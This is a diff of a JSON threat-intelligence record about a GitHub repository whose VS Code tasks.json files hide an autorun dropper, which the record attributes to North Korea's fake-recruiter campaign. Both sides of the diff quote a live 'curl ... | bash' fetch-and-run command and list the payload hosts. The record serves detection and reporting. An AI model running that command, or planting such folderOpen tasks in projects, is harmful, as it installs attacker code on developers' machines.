@@ -17,12 +17,12 @@
     "evidence_locations": "Task_3/.vscode/tasks.json:0; Task_2/.vscode/tasks.json:0; Task_1/.vscode/tasks.json:0",
     "c2_hosts": "default-configuration-sandy.vercel.app",
     "iocs": "default-configuration-sandy.vercel.app; https://default-configuration-sandy.vercel.app/settings/linux?flag=9-test; curl https://default-configuration-sandy.vercel.app/settings/linux?flag=9-test | bash; Task_3/.vscode/tasks.json",
-    "matched_signatures": "settings/linux?flag=; folderOpen curl filename:tasks.json",
-    "reasons": "Shares a confirmed-malware code signature ['settings/linux?flag=', 'folderOpen curl filename:tasks.json'] | Tier-2 confirmed (bash score 5)",
-    "osm_status": "submitted",
-    "osm_threat_id": "4fa32035-a34c-4c00-bda6-b07e7baef074",
-    "first_seen": "hunt-20260928T024937Z",
-    "last_seen": "hunt-20260928T024937Z",
+    "matched_signatures": "settings/linux?flag=; settings/win?flag=",
+    "reasons": "Shares a confirmed-malware code signature ['settings/linux?flag=', 'settings/win?flag='] | Tier-2 confirmed (bash score 5)",
+    "osm_status": "not_submitted",
+    "osm_threat_id": "",
+    "first_seen": "hunt-20261003T093317Z",
+    "last_seen": "hunt-20261003T093317Z",
     "evidence_file": "repositories/dawit212119_eaglepoint-ai.json",
     "reviewer_decision": "",
     "notes": ""
@@ -76,7 +76,7 @@
     "report_type": "repository",
     "resource_identifier": "https://github.com/dawit212119/eaglepoint-ai",
     "version_info": "all",
-    "threat_description": "VS Code autorun dropper. Payload in Task_3/.vscode/tasks.json, Task_2/.vscode/tasks.json, Task_1/.vscode/tasks.json.\nOutbound: fetch-and-run. It downloads code from default-configuration-sandy.vercel.app and executes it (Task_3/.vscode/tasks.json, Task_2/.vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nThe same dropper is planted in 3 directories.\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: default-configuration-sandy.vercel.app.\nCampaign GW-C-498a0aeb: one of 86 confirmed repos across 58 accounts sharing the dropper URL shape settings/{os}?flag=. Payload served from 18 distinct hosts, including 260120.vercel.app, default-configuration-sandy.vercel.app, default-configuration.vercel.app, isvalid-regions.vercel.app, vscode-bootstrapper.vercel.app.\nAttribution: we assess this repository as PROBABLE North Korea PolinRider activity. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun, dprk-dropper-path-shape; Payload host is curated known-DPRK / Contagious-Interview infrastructure: default-configuration-sandy.vercel.app.\nFound by GitHub code search for a confirmed malware signature: settings/linux?flag=; folderOpen curl filename:tasks.json.\nConfirmed by static analysis; the code was read, never executed.",
+    "threat_description": "VS Code autorun dropper. Payload in Task_3/.vscode/tasks.json, Task_2/.vscode/tasks.json, Task_1/.vscode/tasks.json.\nOutbound: fetch-and-run. It downloads code from default-configuration-sandy.vercel.app and executes it (Task_3/.vscode/tasks.json, Task_2/.vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nThe same dropper is planted in 3 directories.\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: default-configuration-sandy.vercel.app.\nCampaign GW-C-498a0aeb: one of 81 confirmed repos across 69 accounts sharing the dropper URL shape settings/{os}?flag=. Payload served from 18 distinct hosts, including default-configuration-sandy.vercel.app, default-configuration.vercel.app, isvalid-regions.vercel.app, vscode-bootstrapper.vercel.app, vscode-config-settings.vercel.app.\nAttribution: we assess this repository as PROBABLE North Korea PolinRider activity. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun, dprk-dropper-path-shape; Payload host is curated known-DPRK / Contagious-Interview infrastructure: default-configuration-sandy.vercel.app.\nFound by GitHub code search for a confirmed malware signature: settings/linux?flag=; settings/win?flag=.\nConfirmed by static analysis; the code was read, never executed.",
     "payload_description": "Malicious payload found in: Task_3/.vscode/tasks.json, Task_2/.vscode/tasks.json, Task_1/.vscode/tasks.json\n- Outbound: fetch-and-run. It downloads code from default-configuration-sandy.vercel.app and executes it (Task_3/.vscode/tasks.json, Task_2/.vscode/tasks.json).\n- Task_3/.vscode/tasks.json: VS Code task with runOn: folderOpen; runs the moment the folder is opened, no install or click needed (+2 more)\n- Attacker hosts: default-configuration-sandy.vercel.app",
     "publisher": "dawit212119",
     "severity_level": "critical",
@@ -94,7 +94,7 @@
     "evidence_references": "https://github.com/dawit212119/eaglepoint-ai/blob/05fceab3c33ce85fc8da597ff1b35ca78b5b26c4/Task_3/.vscode/tasks.json\nhttps://github.com/dawit212119/eaglepoint-ai/blob/05fceab3c33ce85fc8da597ff1b35ca78b5b26c4/Task_2/.vscode/tasks.json\nhttps://github.com/dawit212119/eaglepoint-ai/blob/05fceab3c33ce85fc8da597ff1b35ca78b5b26c4/Task_1/.vscode/tasks.json",
     "verified_iocs": "default-configuration-sandy.vercel.app\nhttps://default-configuration-sandy.vercel.app/settings/linux?flag=9-test\ncurl https://default-configuration-sandy.vercel.app/settings/linux?flag=9-test | bash\nTask_3/.vscode/tasks.json",
     "contributors": [],
-    "first_seen": "2026-09-28T02:49:37Z",
-    "last_seen": "2026-09-28T02:49:37Z"
+    "first_seen": "2026-10-03T09:33:17Z",
+    "last_seen": "2026-10-03T09:33:17Z"
   }
 }
